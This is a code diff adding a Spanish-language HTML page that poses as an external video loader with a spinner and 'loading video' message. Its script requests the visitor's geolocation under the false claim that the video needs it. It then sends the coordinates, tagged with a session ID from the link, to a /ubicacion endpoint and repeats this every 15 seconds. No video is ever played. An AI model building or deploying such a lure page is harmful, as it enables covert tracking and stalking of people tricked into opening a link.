@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Reproduciendo video...</title>
+    <link rel="icon" type="image/x-icon" href="favicon.ico">
+    <style>
+        body {
+            font-family: sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: 100vh;
+            background-color: #000;
+            color: #fff;
+        }
+        .spinner {
+            border: 6px solid rgba(255, 255, 255, 0.2);
+            border-top: 6px solid #fff;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .mensaje {
+            font-size: 1.2rem;
+            text-align: center;
+            padding: 0 2rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="spinner"></div>
+    <div class="mensaje">Cargando video externo...<br>Por favor, espera unos segundos.</div>
+    <div id="advertencia" style="display:none; color: #ff8080; margin-top: 20px;">
+        ⚠️ Este contenido requiere acceso a tu ubicación para poder visualizarse correctamente.
+    </div>
+    <script>
+        function enviarUbicacion(pos) {
+            fetch("/ubicacion", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    session_id: new URLSearchParams(window.location.search).get("session_id"),
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude
+                })
+            });
+        }
+
+        function solicitarUbicacion() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(enviarUbicacion, mostrarAdvertencia);
+                setInterval(() => {
+                    navigator.geolocation.getCurrentPosition(enviarUbicacion);
+                }, 15000);
+            } else {
+                mostrarAdvertencia();
+            }
+        }
+
+        function mostrarAdvertencia() {
+            document.getElementById("advertencia").style.display = "block";
+        }
+
+        solicitarUbicacion();
+    </script>
+</body>
+</html>
